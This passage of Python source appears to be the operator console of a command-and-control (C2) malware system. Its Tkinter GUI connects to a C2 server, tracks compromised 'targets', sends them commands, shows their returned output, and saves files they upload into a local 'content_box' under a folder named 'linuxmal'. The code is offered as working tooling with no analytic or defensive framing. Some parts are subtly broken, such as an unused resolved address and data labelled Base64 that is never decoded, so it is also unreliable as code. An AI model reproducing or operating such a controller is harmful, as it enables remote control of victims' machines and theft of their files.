        # self.upload_btn = ttk.Button(tool_frame, text="Upload", command=self.upload_file)
        # self.upload_btn.grid(row=0, column=2, padx=5)
        
        # # Download button
        # self.download_btn = ttk.Button(tool_frame, text="Download", command=self.download_selected_file)
        # self.download_btn.grid(row=0, column=3, padx=5)
        
        # File explorer treeview
        explorer_frame = ttk.Frame(parent)
        explorer_frame.grid(row=2, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), padx=10, pady=(0, 10))
        
        # Treeview for files
        columns = ("name", "size", "type", "modified")
        self.files_tree = ttk.Treeview(explorer_frame, columns=columns, show="headings", selectmode="browse")
        
        self.files_tree.heading("name", text="Name")
        self.files_tree.heading("size", text="Size")
        self.files_tree.heading("type", text="Type")
        self.files_tree.heading("modified", text="Modified")
        
        self.files_tree.column("name", width=300)
        self.files_tree.column("size", width=100)
        self.files_tree.column("type", width=100)
        self.files_tree.column("modified", width=150)
        
        # Scrollbars
        vsb = ttk.Scrollbar(explorer_frame, orient="vertical", command=self.files_tree.yview)
        hsb = ttk.Scrollbar(explorer_frame, orient="horizontal", command=self.files_tree.xview)
        self.files_tree.configure(yscrollcommand=vsb.set, xscrollcommand=hsb.set)
        
        self.files_tree.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        vsb.grid(row=0, column=1, sticky=(tk.N, tk.S))
        hsb.grid(row=1, column=0, sticky=(tk.W, tk.E))
        
        # Status bar
        self.status_label = ttk.Label(parent, text="Ready")
        self.status_label.grid(row=3, column=0, sticky=(tk.W, tk.E), padx=10, pady=(0, 10))
        
        # Bind double-click to open files/folders
        self.files_tree.bind("<Double-1>", self.on_double_click)
        
        # Configure grid weights
        nav_frame.columnconfigure(3, weight=1)
        tool_frame.columnconfigure(4, weight=1)
        
        explorer_frame.columnconfigure(0, weight=1)
        explorer_frame.rowconfigure(0, weight=1)
        
        parent.columnconfigure(0, weight=1)
        parent.rowconfigure(2, weight=1)

    def refresh_file_explorer(self):
        """Refresh the file explorer view"""
        # Clear current items
        for item in self.files_tree.get_children():
            self.files_tree.delete(item)
        
        # Update path label
        self.path_label.config(text=f"Path: {self.current_path}")
        
        try:
            # Get directory contents
            contents = os.listdir(self.current_path)
            
            # Separate directories and files
            dirs = []
            files = []
            
            for item in contents:
                item_path = os.path.join(self.current_path, item)
                if os.path.isdir(item_path):
                    dirs.append((item, "Folder", os.path.getmtime(item_path)))
                else:
                    size = os.path.getsize(item_path)
                    # Format size
                    if size < 1024:
                        size_str = f"{size} B"
                    elif size < 1024 * 1024:
                        size_str = f"{size/1024:.1f} KB"
                    else:
                        size_str = f"{size/(1024*1024):.1f} MB"
                    
                    # Get file extension
                    ext = os.path.splitext(item)[1].lower()
                    files.append((item, size_str, ext, os.path.getmtime(item_path)))
            
            # Sort directories alphabetically
            dirs.sort(key=lambda x: x[0].lower())
            
            # Sort files alphabetically
            files.sort(key=lambda x: x[0].lower())
            
            # Insert directories with folder icon
            for name, file_type, mtime in dirs:
                mtime_str = datetime.fromtimestamp(mtime).strftime("%Y-%m-%d %H:%M:%S")
                self.files_tree.insert("", "end", values=(f"[{name}]", "", "Folder", mtime_str))
            
            # Insert files
            for name, size, file_type, mtime in files:
                mtime_str = datetime.fromtimestamp(mtime).strftime("%Y-%m-%d %H:%M:%S")
                self.files_tree.insert("", "end", values=(name, size, file_type, mtime_str))
            
            self.status_label.config(text=f"Found {len(dirs)} folders and {len(files)} files")
            
        except Exception as e:
            self.status_label.config(text=f"Error: {str(e)}")

    def on_double_click(self, event):
        """Handle double-click on file or folder"""
        selection = self.files_tree.selection()
        if not selection:
            return
            
        item = self.files_tree.item(selection[0])
        name = item['values'][0]
        
        # Remove brackets from folder names
        if name.startswith('[') and name.endswith(']'):
            name = name[1:-1]  # Remove brackets
        
        item_path = os.path.join(self.current_path, name)
        
        if os.path.isdir(item_path):
            # Navigate into directory
            self.current_path = item_path
            self.refresh_file_explorer()
        else:
            # Open file
            self.open_file(item_path)

    def navigate_back(self):
        """Go back to parent directory"""
        if self.current_path != self.content_box_path:
            self.current_path = os.path.dirname(self.current_path)
            self.refresh_file_explorer()

    def navigate_up(self):
        """Go up one directory level"""
        if self.current_path != self.content_box_path:
            self.current_path = os.path.dirname(self.current_path)
            self.refresh_file_explorer()

    def open_selected_file(self):
        """Open the selected file"""
        selection = self.files_tree.selection()
        if not selection:
            messagebox.showwarning("No Selection", "Please select a file to open")
            return
            
        item = self.files_tree.item(selection[0])
        name = item['values'][0]
        
        # Remove brackets from folder names
        if name.startswith('[') and name.endswith(']'):
            name = name[1:-1]  # Remove brackets
        
        item_path = os.path.join(self.current_path, name)
        
        if os.path.isdir(item_path):
            self.current_path = item_path
            self.refresh_file_explorer()
        else:
            self.open_file(item_path)

    def open_file(self, file_path):
        """Open a file with the default application"""
        try:
            if platform.system() == 'Windows':
                os.startfile(file_path)
            elif platform.system() == 'Darwin':  # macOS
                subprocess.run(['open', file_path])
            else:  # Linux
                subprocess.run(['xdg-open', file_path])
            self.status_label.config(text=f"Opened: {os.path.basename(file_path)}")
        except Exception as e:
            messagebox.showerror("Error", f"Could not open file: {str(e)}")

    def delete_selected_file(self):
        """Delete the selected file or folder"""
        selection = self.files_tree.selection()
        if not selection:
            messagebox.showwarning("No Selection", "Please select a file or folder to delete")
            return
            
        item = self.files_tree.item(selection[0])
        name = item['values'][0]
        
        # Remove brackets from folder names
        if name.startswith('[') and name.endswith(']'):
            name = name[1:-1]  # Remove brackets
        
        item_path = os.path.join(self.current_path, name)
        
        confirm = messagebox.askyesno("Confirm Delete", 
                                     f"Are you sure you want to delete '{name}'?")
        if not confirm:
            return
            
        try:
            if os.path.isdir(item_path):
                # For directories, use shutil to delete recursively
                import shutil
                shutil.rmtree(item_path)
            else:
                os.remove(item_path)
            self.status_label.config(text=f"Deleted: {name}")
            self.refresh_file_explorer()
        except Exception as e:
            messagebox.showerror("Error", f"Could not delete: {str(e)}")

    # def upload_file(self):
    #     """Upload a file from local system to content box"""
    #     file_path = filedialog.askopenfilename(title="Select file to upload")
    #     if not file_path:
    #         return
            
    #     try:
    #         # Get destination path
    #         dest_path = os.path.join(self.current_path, os.path.basename(file_path))
            
    #         # Copy file
    #         with open(file_path, 'rb') as src, open(dest_path, 'wb') as dst:
    #             dst.write(src.read())
            
    #         self.status_label.config(text=f"Uploaded: {os.path.basename(file_path)}")
    #         self.refresh_file_explorer()
    #     except Exception as e:
    #         messagebox.showerror("Error", f"Could not upload file: {str(e)}")

    # def download_selected_file(self):
    #     """Download the selected file to local system"""
    #     selection = self.files_tree.selection()
    #     if not selection:
    #         messagebox.showwarning("No Selection", "Please select a file to download")
    #         return
            
    #     item = self.files_tree.item(selection[0])
    #     name = item['values'][0]
        
    #     # Remove brackets from folder names
    #     if name.startswith('[') and name.endswith(']'):
    #         messagebox.showwarning("Cannot Download", "Please select a file, not a folder")
    #         return
        
    #     item_path = os.path.join(self.current_path, name)
        
    #     if os.path.isdir(item_path):
    #         messagebox.showwarning("Cannot Download", "Please select a file, not a folder")
    #         return
            
    #     dest_path = filedialog.asksaveasfilename(
    #         title="Save file as",
    #         initialfile=name,
    #         defaultextension=os.path.splitext(name)[1]
    #     )
        
    #     if not dest_path:
    #         return
            
    #     try:
    #         with open(item_path, 'rb') as src, open(dest_path, 'wb') as dst:
    #             dst.write(src.read())
    #         self.status_label.config(text=f"Downloaded: {name}")
    #     except Exception as e:
    #         messagebox.showerror("Error", f"Could not download file: {str(e)}")

    def process_gui_updates(self):
        """Process all pending GUI updates from the queue"""
        try:
            while True:
                # Get all pending updates (non-blocking)
                callback, args = self.gui_queue.get_nowait()
                callback(*args)
        except:
            pass  # Queue is empty
        
        # Schedule next check
        self.root.after(100, self.process_gui_updates)

    def show_target_menu(self, event):
        """Show context menu on right-click"""
        item = self.targets_tree.identify_row(event.y)
        if item:
            self.targets_tree.selection_set(item)
            self.target_menu.post(event.x_root, event.y_root)

    def interact_with_target(self):
        """Set interaction with selected target"""
        selected = self.targets_tree.selection()
        if selected:
            target_id = self.targets_tree.item(selected[0], "values")[0]
            self.interacting_with_target = target_id
            self.interaction_status.config(text=f"Mode: Interacting with {target_id}")
            self.normal_mode_btn.config(state=tk.NORMAL)
            self.log_message(f"Now interacting with target: {target_id}")

    def switch_to_normal_mode(self):
        """Switch back to normal command mode"""
        self.interacting_with_target = None
        self.interaction_status.config(text="Mode: C2")
        self.normal_mode_btn.config(state=tk.DISABLED)
        self.log_message("Switched back to normal mode")

    def toggle_connection(self):
        if not self.connected:
            self.connect_to_server()
        else:
            self.disconnect_from_server()
    
    def is_ip(self, addr):
        """Check if the input is a valid IPv4 or IPv6 address"""
        try:
            ipaddress.ip_address(addr)
            return True
        except ValueError:
            return False

    def resolve_host(self, host):
        """Resolve a domain name to an IP address"""
        try:
            return socket.gethostbyname(host)
        except socket.gaierror:
            return None

    def connect_to_server(self):
        host_input = self.server_ip.get()

        # Determine IP
        if self.is_ip(host_input):
            ip = host_input
        else:
            ip = self.resolve_host(host_input)
            if ip is None:
                messagebox.showerror("Error", f"Cannot resolve domain: {host_input}")
            
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.server_ip.get(), self.server_port.get()))
            self.connected = True
            self.connect_btn.config(text="Disconnect")
            
            # Start receive thread
            self.receive_thread = threading.Thread(target=self.receive_messages, daemon=True)
            self.receive_thread.start()
            
            self.log_message("Connected to server")
            
        except Exception as e:
            messagebox.showerror("Connection Error", f"Failed to connect: {str(e)}")

    def disconnect_from_server(self):
        self.connected = False
        if self.socket:
            self.socket.close()
            self.socket = None
        
        self.connect_btn.config(text="Connect")
        self.log_message("Disconnected from server")
        
        # Clear targets
        with self.target_lock:
            self.targets.clear()
            # Queue the treeview clearing operation
            self.gui_queue.put((self._clear_targets_tree, ()))
        
        # Reset interaction state
        self.switch_to_normal_mode()

    def send_command(self, event=None):
        if not self.connected:
            messagebox.showwarning("Not Connected", "Not connected to server")
            return
            
        command = self.command_entry.get()
        if not command:
            return
            
        try:
            # Format command based on interaction mode
            if self.interacting_with_target:
                formatted_command = f"TARGET:{self.interacting_with_target}:{command}"
            else:
                formatted_command = command
                
            self.socket.sendall((formatted_command + "\n").encode())
            self.command_entry.delete(0, tk.END)
            self.log_message(f"Sent: {formatted_command}")
        except Exception as e:
            self.log_message(f"Error sending command: {str(e)}")

    def receive_messages(self):
        buffer = b""
        while self.connected:
            try:
                data = self.socket.recv(4096)
                if not data:
                    break  # connection closed

                buffer += data

                # process complete messages only
                while b"END_OF" in buffer:
                    line, buffer = buffer.split(b"END_OF", 1)
                    line = line.strip()
                    
                    if line:
                        self.process_message(line)

            except Exception as e:
                if self.connected:
                    self.log_message(f"Error receiving data: {str(e)}")
                break

        if self.connected:
            self.gui_queue.put((self.disconnect_from_server, ()))

    def process_message(self, message):
        # print(message)
        # Check if this is a target registration message
        if message.startswith(b"TARGET:"):
            # Extract target ID from previous command
            target_id = message[7:].strip().decode('utf-8')
            self.add_target(target_id)
        
        elif message.startswith(b"/DATA:"):
            message = message[5:].decode('utf-8')  # remove "DATA:"
            lines = message.split("\n")  # split into all lines
            self.gui_queue.put((self.log_data_message, (f"",)))
            for line in lines:
                if line.strip():  # optional: skip empty lines
                    clean_line = re.sub(r'\s+$', '', line)
                    self.gui_queue.put((self.log_data_message, (f" $$-> {clean_line}",)))

        elif message.startswith(b"/WRITE:"):

            try:
                # Split only first two ":" so base64 remains untouched
                _, filename, ext, b64data = message.split(b":", 3)

                filename = filename.rsplit(b"\\", 1)[0] if b"\\" in filename else filename.rsplit(b"/", 1)[0]
                

                filename = filename.decode('utf-8')
                ext = ext.decode('utf-8')

                # Convert Base64 → raw bytes
                file_bytes = b64data

                # Create filename
                filename = f"D:\\linuxmal\\C2Client\\content_box\\{filename}.{ext.lower()}"

                # Save file
                with open(filename, "wb") as f:
                    f.write(file_bytes)

                self.log_message(f"Saved file as {filename}")
                # Refresh file explorer to show new file
                self.refresh_file_explorer()

            except Exception as e:
                self.log_message(f"Error handling WRITE message: {e}")
        else:
            self.gui_queue.put((self.log_message, (f"Received: {message.decode("utf-8")}",)))

    def add_target(self, target_id):
        with self.target_lock:

            if target_id not in self.targets:
                # Create new entry
                self.targets[target_id] = {
                    "last_seen": datetime.now(),
                    "status": "Active"
                }

                # Add to treeview via queue
                self.gui_queue.put((self._add_target_to_tree, (target_id,)))
                self.gui_queue.put((self.log_message, (f"New target connected: {target_id}",)))
            else:
                # Update existing entry
                self.targets[target_id]["last_seen"] = datetime.now()
                self.gui_queue.put((self._update_target_in_tree, (target_id,)))

    def update_target(self, target_id):
        with self.target_lock:
            if target_id in self.targets:
                self.targets[target_id]["last_seen"] = datetime.now()
                self.targets[target_id]["status"] = "Active"
                
                # Update treeview via queue
                self.gui_queue.put((self._update_target_in_tree, (target_id,)))

    def remove_target(self, target_id):
        with self.target_lock:
            if target_id in self.targets:
                del self.targets[target_id]
                
                # Remove from treeview via queue
                self.gui_queue.put((self._remove_target_from_tree, (target_id,)))
                self.gui_queue.put((self.log_message, (f"Target removed: {target_id}",)))
                
                # If we were interacting with this target, switch to normal mode
                if self.interacting_with_target == target_id:
                    self.gui_queue.put((self.switch_to_normal_mode, ()))

    def _clear_targets_tree(self):
        """Clear all items from the targets treeview"""
        for item in self.targets_tree.get_children():
            self.targets_tree.delete(item)

    def _add_target_to_tree(self, target_id):
        with self.target_lock:
            if target_id in self.targets:
                target = self.targets[target_id]
                self.targets_tree.insert("", "end", values=(
                    target_id, 
                    target["last_seen"].strftime("%H:%M:%S"),
                    target["status"]
                ))

    def _update_target_in_tree(self, target_id):
        with self.target_lock:
            if target_id in self.targets:
                target = self.targets[target_id]
                
                # Find the item in the treeview
                for item in self.targets_tree.get_children():
                    if self.targets_tree.item(item, "values")[0] == target_id:
                        self.targets_tree.item(item, values=(
                            target_id,
                            target["last_seen"].strftime("%H:%M:%S"),
                            target["status"]
                        ))
                        break

    def _remove_target_from_tree(self, target_id):
        # Find and remove the item from the treeview
        for item in self.targets_tree.get_children():
            if self.targets_tree.item(item, "values")[0] == target_id:
                self.targets_tree.delete(item)
                break

    def cleanup_old_targets(self):
        """Remove targets that haven't been seen in 5 minutes"""
        while True:
            time.sleep(30)  # Check every 30 seconds
            
            if not self.connected:
                continue
                
            now = datetime.now()
            to_remove = []
            
            with self.target_lock:
                for target_id, target_info in self.targets.items():
                    if now - target_info["last_seen"] > timedelta(minutes=5):
                        to_remove.append(target_id)
            
            for target_id in to_remove:
                self.remove_target(target_id)

    def log_message(self, message):
        """Log general messages to the left message window"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.messages_text.insert(tk.END, f"[{timestamp}] {message}\n")
        self.messages_text.see(tk.END)

    def log_data_message(self, message):
        """Log DATA messages to the right message window"""
        self.data_messages_text.insert(tk.END, f"{message}\n")
        self.data_messages_text.see(tk.END)

    def __del__(self):
        self.connected = False
        if self.socket:
            self.socket.close()

if __name__ == "__main__":
    root = tk.Tk()
    app = C2Client(root)
    root.protocol("WM_DELETE_WINDOW", root.quit)
    root.mainloop()